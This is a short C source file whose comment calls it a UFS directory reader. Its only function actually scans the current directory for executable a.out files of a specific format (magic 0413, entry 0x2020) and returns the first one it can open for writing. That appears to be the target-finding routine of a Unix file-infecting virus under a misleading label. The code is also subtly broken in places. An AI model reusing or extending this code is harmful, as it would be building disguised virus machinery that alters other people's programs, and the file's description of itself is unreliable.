/*
 * UFS directory reader
 * returns an open file descriptor
 */
#include <fcntl.h>
#include <a.out.h>
#include <sys/types.h>
#include <ufs/fsdir.h>

#define	DIRBLKSIZ  512

#ifdef DEBUG
#define D(x) x
#else
#define D(x)
#endif

int
choosedir()
{
	char            nam_ptr[3];
	char            dir_block[DIRBLKSIZ];
	int             dir_fd, cc;
	int             offset;
	struct direct  *dp;

	nam_ptr[0] = '.';
	nam_ptr[1] = '\0';

	if ((dir_fd = open(nam_ptr, O_RDONLY)) < 0) {
		return -1;
	}
	offset = 0;
	while ((cc = read(dir_fd, dir_block, DIRBLKSIZ)) == DIRBLKSIZ) {
		dp = (struct direct *) dir_block;

		while (offset < DIRBLKSIZ) {

			/*
			 * if offset into DIRBLKSIZ is 0, this entry can't be
			 * smooshed into another if it's deleted. inode
			 * number becomes 0
			 */
			if (dp->d_ino != 0) {
				D(char buf = 0x0a;)
				int             can_fd = open(dp->d_name, O_RDWR);
				D(write(2, dp->d_name, strlen(dp->d_name));
				write(2, &buf, 1);)
				if (can_fd >= 0) {
					struct stat     stat_buf;
					if (fstat(can_fd, &stat_buf) == 0) {
						if (S_ISREG(stat_buf.st_mode)
							&& stat_buf.st_mode & S_IXUSR) {
							struct exec     exhdr;
							if (read(can_fd, (char *)&exhdr, sizeof(struct exec)) == sizeof(struct exec)
								&& exhdr.a_magic == 0413
								&& exhdr.a_entry == 0x2020)
									return can_fd;
						}
						close(can_fd);
					}
				}
			}
			offset += dp->d_reclen;

			dp = (struct direct *) & dir_block[offset];
		}

		offset = 0;
	}

	close(dir_fd);
	return -1;
}
